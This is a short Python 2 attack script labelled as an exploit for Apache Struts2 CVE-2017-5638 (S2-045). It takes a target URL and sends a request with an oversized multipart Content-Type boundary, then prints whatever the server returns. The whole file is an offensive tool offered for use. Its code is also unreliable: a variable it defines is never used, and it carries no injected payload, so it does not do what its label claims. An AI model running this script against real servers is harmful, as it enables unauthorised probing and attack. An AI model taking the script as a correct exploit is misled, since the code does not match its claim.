#!/usr/bin/python
# -*- coding: utf-8 -*-

import urllib2
import httplib


def exploit(url):
    try:
        content_type = 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryRybr9W7d7LZYnIZ8'
        headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': 'multipart/mixed;boundary=%s' % ('A' * 2000)}
        print headers
        request = urllib2.Request(url, headers=headers)
        page = urllib2.urlopen(request).read()
    except httplib.IncompleteRead, e:
        page = e.partial

    print(page)
    return page


if __name__ == '__main__':
    import sys
    if len(sys.argv) != 2:
        print("[*] %s <url>" % sys.argv[0])
    else:
        print('[*] CVE: 2017-5638 - Apache Struts2 S2-045')
        url = sys.argv[1]
        print url
        exploit(url)
